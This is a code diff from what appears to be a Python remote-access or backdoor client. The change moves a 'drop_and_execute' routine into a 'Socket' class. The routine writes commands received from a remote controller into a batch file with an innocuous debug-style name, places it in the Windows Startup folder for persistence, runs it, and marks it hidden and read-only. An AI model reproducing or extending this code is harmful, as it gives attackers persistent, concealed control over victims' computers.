@@ -53,7 +53,7 @@ class Socket:
                 cmd = cmd.replace("-h ", "")
             cmd = cmd.replace("-batch ", "")
 
-            drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
+            self.drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
             return
 
         # Download file
@@ -164,37 +164,37 @@ class Socket:
             bit_mask >>= 1
         return drives
 
+    @staticmethod
+    def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
+        if not script:
+            return
+        # Format script
+        script = script.replace("/n", "\n")
 
-def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
-    if not script:
-        return
-    # Format script
-    script = script.replace("/n", "\n")
+        # Default file name
+        file_name = "mat-debug-1692.bat"
 
-    # Default file name
-    file_name = "mat-debug-1692.bat"
+        # Create Path to drop and execute
+        if startup:
+            path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
+        else:
+            path = getenv("temp") + "\\" + file_name
 
-    # Create Path to drop and execute
-    if startup:
-        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
-    else:
-        path = getenv("temp") + "\\" + file_name
+        # Drop file
+        try:
+            with open(path, "w+")as f:
+                f.write(script)
+        except PermissionError:
+            return
 
-    # Drop file
-    try:
-        with open(path, "w+")as f:
-            f.write(script)
-    except PermissionError:
-        return
+        # Execute File
+        if execute_file:
+            startfile(path)
 
-    # Execute File
-    if execute_file:
-        startfile(path)
-
-    # Hide File by calling Windows command
-    if low_protect:
-        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
-        system("attrib +h +r " + file_name)
+        # Hide File by calling Windows command
+        if low_protect:
+            chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+            system("attrib +h +r " + file_name)
 
 
 connection = Socket()
